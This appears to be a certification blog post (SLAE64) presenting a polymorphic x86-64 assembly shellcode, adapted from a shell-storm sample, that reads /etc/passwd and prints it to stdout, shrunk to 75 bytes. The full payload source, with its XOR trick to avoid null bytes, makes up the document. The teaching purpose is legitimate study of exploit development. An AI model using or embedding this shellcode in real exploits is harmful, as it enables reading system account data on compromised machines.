# Polymorphic version of Mr. Un1k0d3rs 'read /etc/passwd/' shellcode

Orig source:
```
http://shell-storm.org/shellcode/files/shellcode-878.php
```

My polymorphic version of the shellcode reduces the size by 7 bytes and keeps the same functionality as the original code.

## Changes
1. Usage of smaller instructions such as ```cdq``` to zero out rdx or ```push; pop``` instead of ```mov```
2. Optimized usage of syscall's return values
3. Reuse of nulled registers to avoid xoring others

## Asm
```
BITS 64
; Polymorphic version of Mr. Un1k0d3rs /etc/passwd read shellcode
; Orig Size: 82 bytes
; Polymorphic size: 75 bytes

global _start

section .text

_start:
xor rax, rax
mov rsi, rax ; null out rsi
cdq ; null out rdx
inc al
inc al ; al equals 2 (SYS_OPEN)
jmp _push_filename

_readfile:
; syscall open file
pop rdi ; pop path value
xor byte [rdi + 11], 0x42 ; the last char of the path is 0x42. Xoring it with 0x42 will create a nullbyte to mark its end.
syscall

; syscall read file
xchg rdi, rax ; put new fd in rdi
mov rax, rdx ; rdx is still zero and can be used to null out rax
mov dx, 0xfff; size to read
sub sp, dx ; Make some space on the stack
push rsp
pop rsi ; rsi points to buffer on stack
syscall

; syscall write to stdout
mov rdx, rax ; rax contains the number of read bytes
xor rdi, rdi
push rdi
pop rax ; avoid xor rax,rax
inc rdi ; rdi contains stdout
inc al ; SYS_write
syscall

; syscall exit
xor rax, rax
add al, 60
syscall

_push_filename:
call _readfile
path: db "/etc/passwdB"
```

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student ID: SLAE64-1581
